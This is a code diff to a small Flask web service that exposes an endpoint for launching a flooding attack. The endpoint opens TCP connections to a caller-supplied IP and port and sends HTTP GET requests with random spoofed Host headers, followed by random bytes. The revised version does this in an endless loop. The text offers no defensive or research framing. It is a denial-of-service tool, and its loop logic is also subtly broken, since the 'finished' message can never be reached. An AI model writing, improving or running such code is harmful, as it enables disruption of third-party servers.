@@ -1,5 +1,4 @@
 from flask import Flask, jsonify, request
-from contextlib import suppress
 import socket
 import random
 import os
@@ -15,21 +14,17 @@ def start_attack():
     target_port = data.get('port', 80)
 
     def attack():
-        for _ in range(int(num_attacks)):
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.connect((target_ip, int(target_port)))
-            fake_ip = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
-            host_header = f"Host: {fake_ip}\r\n"
-            payload = f"GET / HTTP/1.1\r\n{host_header}\r\n"
+        s = socket.create_connection((target_ip, target_port))
+        fake_ip = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
+        host_header = f"Host: {fake_ip}\r\n"
+        payload = f"GET / HTTP/1.1\r\n{host_header}\r\n"
+        while True:
             s.send(payload.encode())
-            s.send(os.urandom(int(num_bytes)))
-            s.close()
+            s.send(os.urandom(num_bytes))
+        
 
-    for _ in range(int(data.get('threads', 10))):
-      while True:
-
-
-          with suppress(Exception):
+    for _ in range(data.get('threads', 10)):
+        for _ in range(num_attacks):
             attack()
 
     return jsonify({'success': True, 'message': 'Attack finished successfully.'})
